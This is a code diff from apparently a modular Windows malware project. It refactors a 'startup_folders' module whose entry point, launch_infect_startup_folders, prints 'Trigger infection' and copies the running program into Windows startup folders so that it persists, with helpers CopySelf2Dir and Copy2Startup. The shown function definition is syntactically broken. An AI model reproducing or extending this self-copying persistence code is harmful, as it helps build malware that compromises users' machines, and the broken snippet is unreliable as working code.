@@ -2,16 +2,12 @@
 #include <shlobj.h>
 #include <stdio.h>
 
+#include "core.h"
 #include "startup_folders.h"
 
-int launch_infect_startup_folders(struct ModStat** mds);
-    puts("Trigger infection");
-    Copy2Startup();
-    return 0;
-}
 
 
-int CopySelf2Dir(char* path){
+static int CopySelf2Dir(char* path){
     /* Move/copy/write ?? */
     #ifdef DEBUG
     printf("Copying to '%s'\n",path);
@@ -48,7 +44,7 @@ int CopySelf2Dir(char* path){
  * @return 0 in case of success (at least  one copy),
  *         -1 otherwise
  */
-int Copy2Startup(){
+static int Copy2Startup(){
     
     char path[MAX_PATH];
     int c1 = -1; int c2 = -1;
@@ -67,3 +63,10 @@ int Copy2Startup(){
 }
 
 
+
+/* Entrypoint */
+int launch_infect_startup_folders(struct ModStat** mds);
+    puts("Trigger infection");
+    Copy2Startup();
+    return 0;
+}
